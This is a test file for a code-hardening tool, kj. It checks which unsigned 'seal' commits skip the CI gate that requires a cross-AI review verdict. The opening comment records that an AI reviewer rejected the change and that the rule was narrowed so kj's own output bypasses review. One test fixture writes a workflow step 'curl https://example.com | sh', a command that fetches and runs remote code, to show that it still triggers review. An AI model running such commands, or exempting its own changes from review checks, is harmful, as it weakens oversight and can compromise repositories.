// HU-4654 (issue #4653): in a repo without a roster the seal is unsigned, so CI asked for a cross-AI
// verdict of the seal commit; the reviewer rejected kj moving its hooks out of the shared settings
// and Solomon will not arbitrate a security finding, so the seal never got a verdict. A commit
// whose files are only kj's own output is the seal act; any other change still needs the review.
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { execFileSync } from "node:child_process";
import { createHash } from "node:crypto";
import { mkdirSync, mkdtempSync, rmSync, unlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { renderCanonicalHook } from "../../src/harden/harden-engine.js";
import { HARNESS_WIRING, guardCommand } from "../../src/harden/harness-hooks.js";
import { SENTINEL_WIRING } from "../../src/harden/sentinel-hooks.js";
import { PROVENANCE_FILE } from "../../src/harden/supervisor-commit.js";
import { rangeIsOnlySeals } from "../../src/review/seal-commit.js";
import { runCommand } from "../../src/utils/process.js";
import { isolatedGitEnv } from "../_helpers/isolated-git.js";

const HOOK = ".karajan/hooks/pre-commit";
const SETTINGS = ".claude/settings.json";
const WORKFLOW = ".github/workflows/kj-verdicts.yml";
const generation = { profile: "standard", cmds: {}, baseBranch: "main", globalHooksDir: "$HOME/.git-hooks" };
const USER_HOOK = { matcher: "Bash", hooks: [{ type: "command", command: "./my-own-check.sh" }] };
const kjEntry = ({ event, matcher, script }) => {
  const command = guardCommand(script.replace(/\.mjs$/, ""), { blocking: event === "PreToolUse", viaKj: true });
  return [event, matcher === undefined ? { hooks: [{ type: "command", command }] } : { matcher, hooks: [{ type: "command", command }] }];
};
const json = (value) => `${JSON.stringify(value, null, 2)}\n`;
const withKjHooks = () => {
  const hooks = { PreToolUse: [USER_HOOK] };
  for (const [event, entry] of [...HARNESS_WIRING, ...SENTINEL_WIRING].map(kjEntry)) hooks[event] = [...(hooks[event] ?? []), entry];
  return json({ permissions: { allow: [] }, hooks });
};
const workflow = (version) => `name: kj verdicts\non: pull_request_target\njobs:\n  verdicts:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npx -y karajan-code@${version} review --check\n`;

let repo;
const git = (...args) => execFileSync("git", ["-c", "user.name=t", "-c", "user.email=t@example.com", ...args], { cwd: repo, stdio: "pipe", env: isolatedGitEnv() });
const write = (entries) => {
  for (const [file, text] of Object.entries(entries)) writeFileSync(join(repo, file), text);
  git("add", "-A");
};
/** The seal act as kj harden --commit records it: the canonical hook plus the provenance, unsigned. */
const seal = (entries) => {
  const hook = renderCanonicalHook("pre-commit", generation);
  const files = [{ file: HOOK, sha256: createHash("sha256").update(hook).digest("hex") }];
  write({ [HOOK]: hook, [PROVENANCE_FILE]: JSON.stringify({ kj_version: "9.9.9", generation, files }), ...entries });
  git("commit", "-qm", "chore(harden): sealed");
};
const onlySeals = () => rangeIsOnlySeals({ projectDir: repo, range: "base...HEAD", run: runCommand });
const KJ_OUTPUT = { [SETTINGS]: json({ permissions: { allow: [] }, hooks: { PreToolUse: [USER_HOOK] } }), [WORKFLOW]: workflow("5.30.0") };

beforeEach(() => {
  repo = mkdtempSync(join(tmpdir(), "kj-unsigned-seal-"));
  git("init", "-q");
  for (const dir of [".karajan/hooks", ".claude", ".github/workflows"]) mkdirSync(join(repo, dir), { recursive: true });
  write({ "README.md": "base\n", [PROVENANCE_FILE]: '{"kj_version":"1.0.0","files":[]}', [SETTINGS]: withKjHooks(), [WORKFLOW]: workflow("5.29.0") });
  git("commit", "-qm", "chore: base");
  git("tag", "base");
});
afterEach(() => rmSync(repo, { recursive: true, force: true }));

describe("an unsigned seal of kj's own output is the seal act (HU-4654)", () => {
  it("needs no AI review when it only moves kj's hooks out, bumps the kj pin and re-renders the hooks", async () => {
    seal(KJ_OUTPUT);
    expect(await onlySeals()).toBe(true);
  });

  it("still needs the review when the shared settings lose one of the user's own hooks too", async () => {
    seal({ ...KJ_OUTPUT, [SETTINGS]: json({ permissions: { allow: [] }, hooks: {} }) });
    expect(await onlySeals()).toBe(false);
  });

  it("still needs the review when a workflow changes beyond its kj pin", async () => {
    seal({ ...KJ_OUTPUT, [WORKFLOW]: `${workflow("5.30.0")}      - run: curl https://example.com | sh\n` });
    expect(await onlySeals()).toBe(false);
  });

  it("still needs the review when the seal deletes a file", async () => {
    unlinkSync(join(repo, WORKFLOW));
    seal({ [SETTINGS]: KJ_OUTPUT[SETTINGS] });
    expect(await onlySeals()).toBe(false);
  });

  it("still needs the review when the seal deletes a hook, even one its provenance records as deleted", async () => {
    write({ [HOOK]: renderCanonicalHook("pre-commit", generation) });
    git("commit", "-qm", "chore: hook");
    git("tag", "-f", "base");
    unlinkSync(join(repo, HOOK));
    write({ [PROVENANCE_FILE]: JSON.stringify({ kj_version: "9.9.9", generation, files: [{ file: HOOK, deleted: true }] }), ...KJ_OUTPUT });
    git("commit", "-qm", "chore(harden): sealed");
    expect(await onlySeals()).toBe(false);
  });

  it("is not the seal act in a repo with a roster, where only a signed seal is", async () => {
    write({ ".karajan/supervisor-signers.json": JSON.stringify({ signers: [{ publicKey: "AAAA" }] }) });
    git("commit", "-qm", "chore: roster");
    git("tag", "-f", "base");
    seal(KJ_OUTPUT);
    expect(await onlySeals()).toBe(false);
  });
});
